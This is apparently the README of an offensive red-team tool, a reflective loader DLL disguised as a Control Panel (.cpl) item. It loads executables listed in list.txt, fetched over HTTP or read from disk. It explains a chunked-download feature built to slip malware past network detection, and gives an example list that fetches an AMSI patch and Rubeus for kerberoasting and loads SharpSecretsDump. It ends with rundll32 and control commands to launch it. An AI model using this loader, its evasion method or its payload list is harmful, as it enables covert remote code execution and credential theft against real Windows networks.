## Reflective loader DLL
Exports the CPlApplet function, to be used as a Control Panel Item (CPL) for a proxied execution using Windows Control panel. CPL files are just DLLs renamed to have a _.cpl_ extension.

## Description
To avoid the need for arguments (as CPL items don't get any), it looks for the _list.txt_ file on the same folder, if it is not present, it finishes the execution. 

This file will feed the reflective loader with the executables to run, and each will be loaded sequentially in the order they appear in the file. They can be either remote (through HTTP) or local files.

It is possible to pass arguments to the executables normally as if running them on the terminal, but the _space_ character needs to be escaped with a \ (blackslash) character:
```
<executable>.exe <arg1> <arg2> This\ is\ a\ string\ argument
```

Certain network controls will cut the communication once they detect malware, and the loader won't be able to load it. To avoid this, a functionality was added to donwload the file in chunks, assemble the pieces and load the final result. To use this funcionality, you can use the _chunks_ keyword and specify the number of chunks the file is divided in:

```
chunks <n chunks> http://mydomain/Name.exe
```

For this, the server needs to be prepared beforehand, by splitting the file in a number of chunks, and storing them in a folder with the name of the executable, and each chunk should have the following format:
```
- ServerRoot
--- Name
------ Name.00
------ Name.01
------ Name.02
...snip...
------ Name.nn
```
The _split_ command can be used to achieve this, as an example, this script can be used to generate the required folder on the server root folder:
```bash

```

Example _list.txt_
```txt
http://mydomain.com/amsi_patch.exe
http://mydomain.com/Rubeus.exe kerberoast
C:\Users\Public\SharpSecretsDump.exe
```

### Run
```powershell
rundll32 CPL.cpl,CPlApplet # Normal direct execution
rundll32 shell32,Control_RunDLL CPL.cpl # Execution using Control panel DLL
control CPL.cpl # Execution using Control panel application
```


### References
[T1218.002 - System Binary Proxy Execution: Control Panel](https://attack.mitre.org/techniques/T1218/002/)
 